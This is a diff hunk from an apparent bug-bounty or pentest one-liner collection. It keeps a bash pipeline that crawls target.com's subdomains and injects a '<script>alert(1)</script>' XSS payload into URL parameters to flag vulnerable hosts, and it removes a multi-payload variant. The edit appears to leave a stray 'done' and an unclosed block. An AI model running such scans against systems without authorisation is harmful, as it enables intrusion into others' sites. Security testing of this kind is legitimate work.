@@ -172,14 +172,5 @@ function Invoke-PasswordSearch {
 XSS line
 ~~~~
 echo target.com | subfinder -silent | katana -silent | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
-~~~~
-XSS with multiple payloads
-~~~~
-echo target.com | subfinder -silent | katana -silent | grep '=' | while read host; do 
-    while read payload; do 
-        qsreplace "$payload" | while read url; do 
-            curl -s --path-as-is --insecure "$url" | grep -qs "$payload" && echo "$url \033[0;31m Vulnerable with payload: $payload"; 
-        done 
-    done < xss_payloads.txt
 done
 
